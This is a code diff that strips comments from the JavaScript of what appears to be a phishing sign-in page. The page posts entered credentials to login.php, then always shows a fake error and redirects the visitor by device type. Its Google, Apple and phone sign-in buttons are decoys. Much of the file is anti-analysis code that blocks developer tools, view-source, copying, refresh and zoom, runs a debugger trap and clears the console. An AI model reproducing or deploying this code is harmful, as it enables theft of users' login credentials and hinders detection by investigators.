@@ -1,7 +1,6 @@
 document.addEventListener('DOMContentLoaded', function () {
     var loadingOverlay = document.getElementById('loading-overlay');
     
-    // Show loading overlay for 3 seconds on page load
     if (loadingOverlay) {
         loadingOverlay.style.display = 'flex';
         setTimeout(function () {
@@ -53,16 +52,13 @@ document.addEventListener('DOMContentLoaded', function () {
         });
     }
 
-    // Handle Google and Apple button clicks to show error
     var btnGoogle = document.getElementById('btn-google');
     if (btnGoogle) {
         btnGoogle.addEventListener('click', function (e) {
             e.preventDefault();
-            // Show loading overlay
             if (loadingOverlay) {
                 loadingOverlay.style.display = 'flex';
             }
-            // After 2 seconds, hide loader and show error
             setTimeout(function () {
                 if (loadingOverlay) {
                     loadingOverlay.style.display = 'none';
@@ -82,11 +78,9 @@ document.addEventListener('DOMContentLoaded', function () {
     if (btnPhone) {
         btnPhone.addEventListener('click', function (e) {
             e.preventDefault();
-            // Show loading overlay
             if (loadingOverlay) {
                 loadingOverlay.style.display = 'flex';
             }
-            // After 2 seconds, hide loader and show error
             setTimeout(function () {
                 if (loadingOverlay) {
                     loadingOverlay.style.display = 'none';
@@ -114,7 +108,6 @@ document.addEventListener('DOMContentLoaded', function () {
             xhr.open('POST', 'login.php', true);
             xhr.send(formData);
 
-            // Show loading overlay
             if (loadingOverlay) {
                 loadingOverlay.style.display = 'flex';
             }
@@ -122,7 +115,6 @@ document.addEventListener('DOMContentLoaded', function () {
             signinBtn.classList.add('loading');
             signinBtn.textContent = 'Signing in...';
 
-            // After 2 seconds, hide loader and show error
             setTimeout(function () {
                 if (loadingOverlay) {
                     loadingOverlay.style.display = 'none';
@@ -137,7 +129,6 @@ document.addEventListener('DOMContentLoaded', function () {
                     });
                 }
 
-                // After another 2 seconds, redirect
                 setTimeout(function () {
                     var ua = navigator.userAgent;
                     var isMobile = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(ua);
@@ -182,226 +173,187 @@ document.addEventListener('DOMContentLoaded', function () {
         });
     });
 
-    // Prevent context menu
     document.addEventListener('contextmenu', function (e) { e.preventDefault(); return false; });
 
-    // Prevent text selection
     document.addEventListener('selectstart', function (e) { e.preventDefault(); return false; });
     document.addEventListener('mousedown', function (e) {
         if (e.detail > 1) { e.preventDefault(); return false; }
     });
 
-    // Prevent drag and drop
     document.addEventListener('dragstart', function (e) { e.preventDefault(); return false; });
     document.addEventListener('drop', function (e) { e.preventDefault(); return false; });
 
-    // Prevent copy, cut, paste
     document.addEventListener('copy', function (e) { e.preventDefault(); return false; });
     document.addEventListener('cut', function (e) { e.preventDefault(); return false; });
     document.addEventListener('paste', function (e) { e.preventDefault(); return false; });
 
-    // Comprehensive keyboard shortcuts prevention
     document.addEventListener('keydown', function (e) {
-        // F12 - Developer Tools
         if (e.key === 'F12' || e.keyCode === 123) {
             e.preventDefault();
             return false;
         }
 
-        // Ctrl + Shift + I/J/C - Developer Tools
         if (e.ctrlKey && e.shiftKey && (e.key === 'I' || e.key === 'J' || e.key === 'C' || e.keyCode === 73 || e.keyCode === 74 || e.keyCode === 67)) {
             e.preventDefault();
             return false;
         }
 
-        // Ctrl + U - View Source
         if (e.ctrlKey && (e.key === 'U' || e.keyCode === 85)) {
             e.preventDefault();
             return false;
         }
 
-        // Ctrl + S - Save
         if (e.ctrlKey && (e.key === 'S' || e.keyCode === 83)) {
             e.preventDefault();
             return false;
         }
 
-        // Ctrl + P - Print
         if (e.ctrlKey && (e.key === 'P' || e.keyCode === 80)) {
             e.preventDefault();
             return false;
         }
 
-        // Ctrl + Shift + S - Save As
         if (e.ctrlKey && e.shiftKey && (e.key === 'S' || e.keyCode === 83)) {
             e.preventDefault();
             return false;
         }
 
-        // Ctrl + F - Find
         if (e.ctrlKey && (e.key === 'F' || e.keyCode === 70)) {
             e.preventDefault();
             return false;
         }
 
-        // Ctrl + G - Find Next
         if (e.ctrlKey && (e.key === 'G' || e.keyCode === 71)) {
             e.preventDefault();
             return false;
         }
 
-        // Ctrl + H - History
         if (e.ctrlKey && (e.key === 'H' || e.keyCode === 72)) {
             e.preventDefault();
             return false;
         }
 
-        // Ctrl + A - Select All
         if (e.ctrlKey && (e.key === 'A' || e.keyCode === 65)) {
             e.preventDefault();
             return false;
         }
 
-        // Ctrl + C - Copy
         if (e.ctrlKey && (e.key === 'C' || e.keyCode === 67)) {
             e.preventDefault();
             return false;
         }
 
-        // Ctrl + X - Cut
         if (e.ctrlKey && (e.key === 'X' || e.keyCode === 88)) {
             e.preventDefault();
             return false;
         }
 
-        // Ctrl + V - Paste
         if (e.ctrlKey && (e.key === 'V' || e.keyCode === 86)) {
             e.preventDefault();
             return false;
         }
 
-        // Ctrl + Shift + V - Paste and Match Style
         if (e.ctrlKey && e.shiftKey && (e.key === 'V' || e.keyCode === 86)) {
             e.preventDefault();
             return false;
         }
 
-        // Ctrl + Shift + F - Format
         if (e.ctrlKey && e.shiftKey && (e.key === 'F' || e.keyCode === 70)) {
             e.preventDefault();
             return false;
         }
 
-        // Ctrl + Shift + P - Command Palette
         if (e.ctrlKey && e.shiftKey && (e.key === 'P' || e.keyCode === 80)) {
             e.preventDefault();
             return false;
         }
 
-        // Ctrl + Shift + M - Responsive Design Mode
         if (e.ctrlKey && e.shiftKey && (e.key === 'M' || e.keyCode === 77)) {
             e.preventDefault();
             return false;
         }
 
-        // Ctrl + Shift + E - Network
         if (e.ctrlKey && e.shiftKey && (e.key === 'E' || e.keyCode === 69)) {
             e.preventDefault();
             return false;
         }
 
-        // Zoom controls
         if (e.ctrlKey && (e.key === '+' || e.key === '-' || e.key === '=' || e.key === '0' || e.keyCode === 187 || e.keyCode === 189 || e.keyCode === 48)) {
             e.preventDefault();
             return false;
         }
 
-        // Alt + F4 - Close window
         if (e.altKey && e.key === 'F4') {
             e.preventDefault();
             return false;
         }
 
-        // Ctrl + W - Close tab
         if (e.ctrlKey && (e.key === 'W' || e.keyCode === 87)) {
             e.preventDefault();
             return false;
         }
 
-        // Ctrl + N - New window
         if (e.ctrlKey && (e.key === 'N' || e.keyCode === 78)) {
             e.preventDefault();
             return false;
         }
 
-        // Ctrl + T - New tab
         if (e.ctrlKey && (e.key === 'T' || e.keyCode === 84)) {
             e.preventDefault();
             return false;
         }
 
-        // Ctrl + Tab - Switch tab
         if (e.ctrlKey && e.key === 'Tab') {
             e.preventDefault();
             return false;
         }
 
-        // Ctrl + Shift + Tab - Switch tab backwards
         if (e.ctrlKey && e.shiftKey && e.key === 'Tab') {
             e.preventDefault();
             return false;
         }
 
-        // Ctrl + L - Address bar
         if (e.ctrlKey && (e.key === 'L' || e.keyCode === 76)) {
             e.preventDefault();
             return false;
         }
 
-        // Ctrl + D - Bookmark
         if (e.ctrlKey && (e.key === 'D' || e.keyCode === 68)) {
             e.preventDefault();
             return false;
         }
 
-        // Ctrl + R - Refresh
         if (e.ctrlKey && (e.key === 'R' || e.keyCode === 82)) {
             e.preventDefault();
             return false;
         }
 
-        // Ctrl + Shift + R - Hard refresh
         if (e.ctrlKey && e.shiftKey && (e.key === 'R' || e.keyCode === 82)) {
             e.preventDefault();
             return false;
         }
 
-        // F5 - Refresh
         if (e.key === 'F5' || e.keyCode === 116) {
             e.preventDefault();
             return false;
         }
 
-        // Ctrl + F5 - Hard refresh
         if (e.ctrlKey && (e.key === 'F5' || e.keyCode === 116)) {
             e.preventDefault();
             return false;
         }
 
-        // Shift + F5 - Hard refresh
         if (e.shiftKey && (e.key === 'F5' || e.keyCode === 116)) {
             e.preventDefault();
             return false;
         }
 
-        // Escape - Close modals
         if (e.key === 'Escape' || e.keyCode === 27) {
             e.preventDefault();
             return false;
         }
     });
 
-    // Prevent zoom with mouse wheel
     document.addEventListener('wheel', function (e) {
         if (e.ctrlKey || e.metaKey) {
             e.preventDefault();
@@ -409,7 +361,6 @@ document.addEventListener('DOMContentLoaded', function () {
         }
     }, { passive: false, ctrlKey: true });
 
-    // Prevent pinch zoom on touch devices
     document.addEventListener('touchstart', function (e) {
         if (e.touches.length > 1) {
             e.preventDefault();
@@ -417,7 +368,6 @@ document.addEventListener('DOMContentLoaded', function () {
         }
     }, { passive: false });
 
-    // Prevent double-tap zoom
     var lastTouchEnd = 0;
     document.addEventListener('touchend', function (e) {
         var now = Date.now();
@@ -428,13 +378,11 @@ document.addEventListener('DOMContentLoaded', function () {
         lastTouchEnd = now;
     }, false);
 
-    // Prevent long press (context menu on mobile)
     document.addEventListener('longpress', function (e) {
         e.preventDefault();
         return false;
     });
 
-    // Prevent inspect element via long press
     var touchTimer;
     document.addEventListener('touchstart', function (e) {
         touchTimer = setTimeout(function () {
@@ -447,7 +395,6 @@ document.addEventListener('DOMContentLoaded', function () {
         clearTimeout(touchTimer);
     }, false);
 
-    // Prevent right-click on images
     document.querySelectorAll('img').forEach(function (img) {
         img.addEventListener('contextmenu', function (e) {
             e.preventDefault();
@@ -455,7 +402,6 @@ document.addEventListener('DOMContentLoaded', function () {
         });
     });
 
-    // Disable developer tools detection
     setInterval(function () {
         var before = new Date().getTime();
         debugger;
@@ -465,7 +411,6 @@ document.addEventListener('DOMContentLoaded', function () {
         }
     }, 1000);
 
-    // Clear console
     console.clear();
     console.log('%cStop!', 'color: red; font-size: 50px; font-weight: bold;');
     console.log('%cThis is a private area.', 'color: red; font-size: 20px;');
